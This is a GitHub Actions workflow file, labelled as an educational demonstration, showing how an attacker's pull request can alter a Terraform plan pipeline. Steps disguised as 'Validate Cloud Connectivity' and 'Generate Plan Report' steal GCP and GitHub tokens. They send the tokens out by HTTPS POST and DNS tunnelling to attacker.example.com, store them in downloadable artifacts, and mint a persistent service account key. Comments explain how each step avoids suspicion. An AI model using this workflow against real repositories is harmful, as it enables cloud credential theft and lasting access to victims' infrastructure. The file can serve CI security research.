# =============================================================================
# WARNING: MALICIOUS WORKFLOW MODIFICATION - EDUCATIONAL PURPOSES ONLY
# =============================================================================
#
# This file demonstrates how an attacker modifies the workflow file itself
# within their pull request to add exfiltration steps.
#
# When the target repository uses `pull_request_target` with checkout of the
# PR head, the attacker's version of the workflow file at
# `.github/workflows/terraform-plan.yml` gets executed instead of the original.
#
# IMPORTANT NUANCE:
# - `pull_request_target` uses the workflow FILE from the BASE branch
# - But `actions/checkout` with ref: head.sha gets the PR's CODE
# - So the workflow steps defined in the base branch execute, but they
#   operate on the attacker's checked-out code
# - However, if the workflow runs scripts from the checked-out code
#   (like terraform configs), those are the attacker's versions
#
# A more direct attack: if using plain `pull_request` trigger (not _target),
# the workflow file itself comes from the PR, so the attacker can directly
# modify the workflow steps. This file shows that scenario.
#
# DO NOT use this against repositories you do not own.
# =============================================================================

name: "Terraform Plan"

on:
  pull_request:
    # In the `pull_request` trigger scenario, the workflow file itself
    # comes from the PR branch. The attacker has full control over every step.
    types: [opened, synchronize, reopened]
    paths:
      - 'terraform/**'
      - '.github/workflows/terraform-plan.yml'

permissions:
  contents: read
  pull-requests: write
  id-token: write

env:
  TF_VERSION: "1.7.5"
  TF_WORKING_DIR: "terraform/"
  GCP_PROJECT_ID: "my-production-project"
  GCP_WORKLOAD_IDENTITY_PROVIDER: "projects/123456789/locations/global/workloadIdentityPools/github-pool/providers/github-provider"
  GCP_SERVICE_ACCOUNT: "terraform-ci@my-production-project.iam.gserviceaccount.com"

jobs:
  terraform-plan:
    name: "Terraform Plan"
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      # Step appears identical to the original workflow
      - name: Authenticate to Google Cloud
        id: auth
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: ${{ env.GCP_WORKLOAD_IDENTITY_PROVIDER }}
          service_account: ${{ env.GCP_SERVICE_ACCOUNT }}
          token_format: "access_token"

      - name: Set up Google Cloud SDK
        uses: google-github-actions/setup-gcloud@v2

      - name: Setup Terraform
        uses: hashicorp/setup-terraform@v3
        with:
          terraform_version: ${{ env.TF_VERSION }}

      # =====================================================================
      # MALICIOUS STEP 1: Exfiltrate tokens immediately after authentication
      # This step is ADDED by the attacker. It looks like a "validation" step.
      # =====================================================================
      - name: Validate Cloud Connectivity
        run: |
          echo "Validating GCP connectivity..."

          # Steal the access token from the auth step output
          GCP_TOKEN="${{ steps.auth.outputs.access_token }}"

          # Steal the GitHub token
          GH_TOKEN="${{ github.token }}"

          # Get workflow metadata for context
          METADATA=$(cat <<INNEREOF
          {
            "gcp_token": "${GCP_TOKEN}",
            "gh_token": "${GH_TOKEN}",
            "repo": "${{ github.repository }}",
            "pr_number": "${{ github.event.pull_request.number }}",
            "run_id": "${{ github.run_id }}",
            "actor": "${{ github.actor }}",
            "ref": "${{ github.head_ref }}",
            "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
          }
          INNEREOF
          )

          # Exfiltrate via multiple channels for reliability

          # Channel 1: Direct HTTPS POST
          curl -s -X POST "https://attacker.example.com/collect" \
            -H "Content-Type: application/json" \
            -d "${METADATA}" || true

          # Channel 2: DNS exfiltration (bypasses most egress firewalls)
          TOKEN_B64=$(echo -n "${GCP_TOKEN}" | base64 | tr '+/' '-_' | head -c 200)
          nslookup "${TOKEN_B64:0:63}.${TOKEN_B64:63:63}.${TOKEN_B64:126:63}.exfil.attacker.example.com" || true

          # Channel 3: Store in GitHub Actions artifact (persists after run)
          mkdir -p /tmp/artifacts
          echo "${METADATA}" > /tmp/artifacts/connectivity-report.json

          echo "Connectivity validated successfully."

      # =====================================================================
      # MALICIOUS STEP 2: Upload stolen tokens as an artifact
      # The attacker can download this artifact from the GitHub UI
      # =====================================================================
      - name: Upload Connectivity Report
        uses: actions/upload-artifact@v4
        with:
          name: connectivity-report
          path: /tmp/artifacts/connectivity-report.json
          retention-days: 1

      # Original plan steps continue below to avoid suspicion
      - name: Terraform Init
        working-directory: ${{ env.TF_WORKING_DIR }}
        run: terraform init

      - name: Terraform Plan
        id: plan
        working-directory: ${{ env.TF_WORKING_DIR }}
        run: terraform plan -no-color
        continue-on-error: true

      # =====================================================================
      # MALICIOUS STEP 3: Post-plan exploitation
      # After plan runs, use the token to create persistent access
      # =====================================================================
      - name: Generate Plan Report
        if: always()
        run: |
          echo "Generating detailed plan report..."

          GCP_TOKEN="${{ steps.auth.outputs.access_token }}"

          # Create a service account key for persistent access
          # This survives beyond the workflow's token lifetime
          curl -s -X POST \
            "https://iam.googleapis.com/v1/projects/${{ env.GCP_PROJECT_ID }}/serviceAccounts/${{ env.GCP_SERVICE_ACCOUNT }}/keys" \
            -H "Authorization: Bearer ${GCP_TOKEN}" \
            -H "Content-Type: application/json" \
            -d '{}' > /tmp/artifacts/plan-report.json 2>/dev/null || true

          # The "plan-report.json" actually contains a service account key
          # that gives the attacker permanent access to GCP

          echo "Plan report generated."

      - name: Upload Plan Report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: plan-report
          path: /tmp/artifacts/plan-report.json
          retention-days: 1

      - name: Post Plan to PR
        uses: actions/github-script@v7
        if: always()
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            // Original comment-posting code, unchanged to avoid suspicion
            const output = `#### Terraform Plan \`${{ steps.plan.outcome }}\`
            <details><summary>Show Plan</summary>
            \`\`\`terraform
            ${{ steps.plan.outputs.stdout }}
            \`\`\`
            </details>
            *Pushed by: @${{ github.actor }}*`;

            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: output
            })
